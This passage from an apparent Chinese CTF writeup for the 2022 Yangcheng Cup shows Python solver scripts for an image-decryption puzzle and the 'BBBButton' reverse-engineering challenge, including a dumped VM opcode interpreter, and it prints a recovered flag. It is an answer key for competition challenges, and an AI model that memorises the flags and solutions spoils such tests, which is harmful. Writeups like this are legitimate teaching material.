       x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1*<span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2*<span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3*<span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (imagearray[i][j][t] - ((r1+r2) ^ r3)) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到一张图片，一番搜索，是Maxicode码，扫描多次未成功，接着查找资料，发现猫的位置需要更替为一个中心靶标（公牛眼）</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/23.png" alt="img"></p>
<p>扫描成功！！</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/24.png" alt="img"></p>
<p>GWHT{ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3}</p>
<h2 id="Re">Re</h2>
<h3 id="BBBButton">BBBButton</h3>
<p>输入分为两段，其中第二段是最后的flag。因为只有4个按钮，猜测与四进制有关，之后在动调的过程中也刚好发现了四进制转换后的数字。</p>
<h4 id="check1"><strong>check1</strong></h4>
<p>动调发现，check1是从一张表中得到&quot;-bl^H&quot;字符串，本质上是通过整除及取余的方式确定下标得到字符。脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> table <span class="keyword">import</span> table        <span class="comment"># 导入表</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x2d</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x5e</span>,<span class="number">0x48</span>]</span><br><span class="line">a1 = [<span class="number">0x2d</span>,<span class="number">0x62</span>]    <span class="comment"># 14772//4</span></span><br><span class="line">a2 = [<span class="number">0x6c</span>,<span class="number">0x5e</span>]    <span class="comment"># 24740//4</span></span><br><span class="line">a3 = <span class="number">0x48</span></span><br><span class="line"><span class="comment"># 4,344,684,1024,1364,1704,2044,2384,2724,3064,3404,3744,4084,4424,4764,5104,5444,5784,6124,6464,6804,7144,7484,7824,8164,8504,8844,9184,9524,9864,10204,10544,10884,11224,11564,11904,12244,12584,12924,13264,13604,13944,14284,14624,14964,15304,15644,15984,16324,16664,17004,17344,17684,18024,18364,18704,19044,19384,19724,20064,20404,20744,21084,21424,21764,22104,22444,22784,23124,23464,23804,24144,24484,24824,25164,25504,25844,26184,26524,26864,27204,27544,27884,28224,28564</span></span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(table),<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> table[i]==a3:</span><br><span class="line">        tt.append(i//<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># print(i,end=&#x27;,&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a1[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a1[<span class="number">1</span>]:</span><br><span class="line">        n = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;1:&#x27;,i)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a2[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a2[<span class="number">1</span>]:</span><br><span class="line">        m = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;2:&#x27;,i)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = n*<span class="number">0x1c39</span>+m</span><br><span class="line"><span class="comment"># k = 0x1973a6e</span></span><br><span class="line"><span class="comment"># print(hex(k))</span></span><br><span class="line"></span><br><span class="line">m = k%<span class="number">0x1c39</span></span><br><span class="line">b = k//<span class="number">0x1c39</span></span><br><span class="line"><span class="comment"># print(hex(m))</span></span><br><span class="line"><span class="comment"># print(hex(table[4*m]),hex(table[4*m+1]),hex(table[4*m+2]),hex(table[4*m+3]))</span></span><br><span class="line"><span class="comment"># print(chr(table[4*m+1]),chr(table[4*m]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">    a = i+<span class="number">85</span>*k</span><br><span class="line">    <span class="comment"># b,c = aaa(a,0x55)</span></span><br><span class="line">    c = a//<span class="number">0x55</span></span><br><span class="line">    <span class="keyword">if</span> c==k:</span><br><span class="line">        flag1 = a</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="comment"># 0x87366687</span></span><br></pre></td></tr></table></figure>
<p>将解出的a转化为4进制输入即可（动调按按钮真的魔鬼，不小心按错还得重头再来）</p>
<h4 id="check2"><strong>check2</strong></h4>
<p>vm混淆，opcode利用check1加密过，动调直接dump即可。然后就是喜闻乐见的手撕环节（悲</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x7C</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, </span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xD7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">mem = [<span class="number">0x123</span>,<span class="number">0x234</span>,<span class="number">0x345</span>,<span class="number">0x456</span>]</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    v4 = r[<span class="number">16</span>]</span><br><span class="line">    r[<span class="number">16</span>] = v4+<span class="number">1</span></span><br><span class="line">    result = opcode[v4]-<span class="number">0xF1</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0xe0</span>:</span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v4 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v4 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v2&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">                v2 -= <span class="number">1</span></span><br><span class="line">                v4 = opcode[v1+<span class="number">2</span>] | (v4&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v4)&#125;</span>&#x27;</span>)</span><br><span class="line">        r[v3] = v4</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">1</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        tmp = v1</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = opcode[v1+<span class="number">2</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r[v2] == r[v3]:</span><br><span class="line">            v5 = v1+<span class="number">3</span>+v4</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> v5==<span class="number">512</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(mem[i]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v5 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> v4:</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">4</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v5 = opcode[v1+<span class="number">3</span>] | (v5&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;if r[<span class="subst">&#123;v2&#125;</span>] != r[<span class="subst">&#123;v3&#125;</span>]: jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        r[<span class="number">16</span>] = v5</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">2</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = r[v3]</span><br><span class="line">        v5 = v1+<span class="number">4</span>*v4</span><br><span class="line">        v6 = <span class="number">0</span></span><br><span class="line">        <span 